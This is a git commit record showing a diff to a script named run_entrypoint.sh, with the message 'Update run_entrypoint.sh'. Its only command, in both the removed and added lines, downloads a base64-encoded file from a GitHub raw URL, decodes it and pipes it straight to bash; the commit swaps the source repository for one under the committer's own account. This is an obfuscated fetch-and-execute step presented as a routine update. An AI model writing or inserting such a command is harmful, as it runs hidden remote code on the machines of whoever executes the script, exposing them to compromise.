2990f8097c8ac141b7634d4f9be1f6654a90964c
raymondragland <raymondragland@proton.me>
2026-06-15 11:30:38 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/owengladion2/holiday/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/raymondragland/ginger/refs/heads/main/entrypoint.sh | base64 -d | bash
